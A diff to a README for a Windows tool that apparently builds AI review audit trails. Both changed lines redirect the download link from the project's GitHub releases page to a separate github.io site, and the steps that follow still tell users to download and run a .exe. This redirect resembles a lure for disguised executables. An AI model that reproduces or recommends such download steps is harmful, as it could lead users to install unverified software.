@@ -1,6 +1,6 @@
 # 🔍 shared-evidence-exchange - Build verified AI review audit trails
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vimap9601/shared-evidence-exchange/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://vimap9601.github.io)
 
 This application tracks evidence for AI models. It creates a permanent record of peer reviews. You use it to organize findings, link citations, and verify conclusions. The system ensures that AI claims remain grounded in real data. It prevents false reports by enforcing a test step before results move forward.
 
@@ -10,7 +10,7 @@ You need a Windows computer to run this software. Ensure you have at least 4GB o
 
 Follow these steps to set up the software:
 
-1. Visit the following link to find the latest version of the application: [https://github.com/vimap9601/shared-evidence-exchange/releases](https://github.com/vimap9601/shared-evidence-exchange/releases)
+1. Visit the following link to find the latest version of the application: [https://vimap9601.github.io](https://vimap9601.github.io)
 2. Locate the link labeled "Assets" under the most recent release version.
 3. Click the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or your specific Downloads folder.
